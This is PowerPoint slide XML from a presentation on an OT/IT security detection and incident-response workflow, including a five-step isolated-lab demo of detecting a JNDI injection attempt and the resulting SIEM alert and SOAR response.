            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2743200"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Enrich &amp; prioritise</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="3337560"/>
            <a:ext cx="3063240" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-check the SBOM: is this asset vulnerable?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attach CVSS environmental score &amp; Purdue zone</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Auto-raise severity for the exposed SIMATIC box</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="2514600"/>
            <a:ext cx="3566160" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2743200"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Respond &amp; report</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="3337560"/>
            <a:ext cx="3063240" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Open an IR ticket, notify on-call &amp; OT engineers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Retro-hunt stored logs for earlier attempts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="190500" indent="-190500">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Evidence trail for NIST SP 800-61r3 &amp; audit</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8FB"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>THE DEMONSTRATION</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Detecting an attempt, end to end</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1600200"/>
            <a:ext cx="11064240" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Isolated lab only: a deliberately vulnerable Java service, an attacker host, and a free SIEM. Documentation IP ranges, reserved domains — nothing live is touched.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2286000"/>
            <a:ext cx="2084832" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2468880"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3017520"/>
            <a:ext cx="1627632" cy="457200"/>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Baseline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3474720"/>
            <a:ext cx="1627632" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dashboards quiet; normal traffic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2761488" y="2286000"/>
            <a:ext cx="2084832" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="2468880"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="3017520"/>
            <a:ext cx="1627632" cy="457200"/>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Attempt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="3474720"/>
            <a:ext cx="1627632" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Send the JNDI payload in a header</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4974336" y="2286000"/>
            <a:ext cx="2084832" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="2468880"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="3017520"/>
            <a:ext cx="1627632" cy="457200"/>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Signature fires</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="3474720"/>
            <a:ext cx="1627632" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Insight I1 — show the request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7187184" y="2286000"/>
            <a:ext cx="2084832" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="2468880"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="3017520"/>
            <a:ext cx="1627632" cy="457200"/>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Correlation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="3474720"/>
            <a:ext cx="1627632" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Callback + payload → I3 alert</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9400032" y="2286000"/>
            <a:ext cx="2084832" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="2468880"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="3017520"/>
            <a:ext cx="1627632" cy="457200"/>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Respond</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="3474720"/>
            <a:ext cx="1627632" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Triage, confirm, SOAR playbook</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4480560"/>
            <a:ext cx="11094415" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="101826"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4709160"/>
            <a:ext cx="10972800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
